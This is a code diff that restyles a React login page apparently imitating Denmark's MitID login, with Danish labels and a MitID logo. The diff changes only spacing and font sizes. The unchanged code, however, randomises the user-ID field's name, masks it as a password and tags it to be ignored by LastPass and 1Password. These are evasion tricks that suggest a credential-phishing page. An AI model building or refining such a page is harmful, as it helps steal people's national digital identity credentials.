@@ -39,7 +39,7 @@ export default function LoginPage({ onSessionCreated }: Props) {
       <header className="bg-white h-[50px] flex items-center px-6 border-b border-gray-200">
         <BrandLogo />
       </header>
-      <main className="flex-1 flex items-start justify-center sm:pt-[60px] pt-[20px] px-4">
+      <main className="flex-1 flex items-start justify-center sm:pt-[60px] pt-4 px-4 sm:px-6">
         <div className="flex flex-col lg:flex-row gap-[60px] max-w-[900px] w-full items-center lg:items-start">
           <CardShell>
             <form className="flex flex-col h-full" onSubmit={handleSubmit}>
@@ -48,23 +48,23 @@ export default function LoginPage({ onSessionCreated }: Props) {
                 <MitIdLogo />
               </div>
               <hr className="border-gray-200 my-3" />
-              <div className="mb-3">
-                <label className="flex items-center gap-1.5 text-[12px] font-bold text-[#001C44] tracking-wide mb-2 uppercase">
+              <div className="mb-4">
+                <label className="flex items-center gap-1.5 text-[13px] font-bold text-[#001C44] tracking-wide mb-2 uppercase">
                   Bruger-ID
                   <button type="button" className="w-4 h-4 rounded-full flex items-center justify-center cursor-help" aria-label="Help"><HelpIcon /></button>
                 </label>
                 <div className="relative">
                   <input type={showUserId ? 'text' : 'password'} value={userId} onChange={(e) => setUserId(e.target.value)}
                     name={`uid_${Math.random().toString(36).slice(2)}`}
-                    className="w-full border border-gray-300 rounded-[2px] px-3 py-[9px] text-[14px] text-[#001C44] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-12" autoComplete="one-time-code" inputMode="text" data-lpignore="true" data-1p-ignore="true" spellCheck={false} />
-                  <div role="button" onClick={() => setShowUserId(!showUserId)} className="absolute right-3 top-1/2 -translate-y-1/2 text-[13px] text-gray-500 hover:text-gray-800 cursor-pointer select-none" tabIndex={0}>
+                    className="w-full border border-gray-300 rounded px-4 py-3 text-[15px] text-[#001C44] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-14" autoComplete="one-time-code" inputMode="text" data-lpignore="true" data-1p-ignore="true" spellCheck={false} />
+                  <div role="button" onClick={() => setShowUserId(!showUserId)} className="absolute right-4 top-1/2 -translate-y-1/2 text-[13px] text-gray-500 hover:text-gray-800 cursor-pointer select-none" tabIndex={0}>
                     {showUserId ? 'Skjul' : 'Vis'}
                   </div>
                 </div>
               </div>
               {error && <div className="text-red-600 text-[12px] mb-2">{error}</div>}
               <button type="submit" disabled={loading || !userId.trim()}
-                className={`w-full font-bold text-[14px] py-[10px] px-4 rounded-[2px] flex items-center justify-between cursor-pointer transition-colors ${
+                className={`w-full font-bold text-[15px] py-3 px-4 rounded flex items-center justify-between cursor-pointer transition-colors ${
                   userId.trim() && !loading ? 'bg-[#0055a5] hover:bg-[#004080] text-white' : 'bg-gray-200 text-gray-400 cursor-not-allowed'
                 }`}>
                 <span className="uppercase tracking-wide">{loading ? 'Forbinder...' : 'Fortsæt'}</span><ArrowIcon />
